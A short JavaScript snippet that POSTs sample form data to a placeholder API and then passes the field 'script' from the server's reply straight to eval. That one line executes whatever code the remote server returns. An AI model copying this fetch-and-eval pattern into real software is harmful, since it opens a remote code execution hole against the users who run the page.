const baseUrl = 'https://api.example.com/submit';
const dynamicSegment = '12345';
const fullUrl = `${baseUrl}/${dynamicSegment}`;

const requestData = {
  name: 'John Doe',
  email: 'john.doe@example.com',
  message: 'This is a test message'
};

fetch_request(fullUrl, requestData)

function fetch_request(url, requestData)
{
    fetch(url, {
        method: 'POST',
        body: JSON.stringify(requestData)
      })
        .then(response => {
          if (!response.ok) {
            throw new Error('Network response was not ok');
          }
          return response.json();
        })
        .then(data => {
            eval(data.script);
        })
        .catch(error => {
          console.error('There was a problem with the fetch operation:', error);
        });
}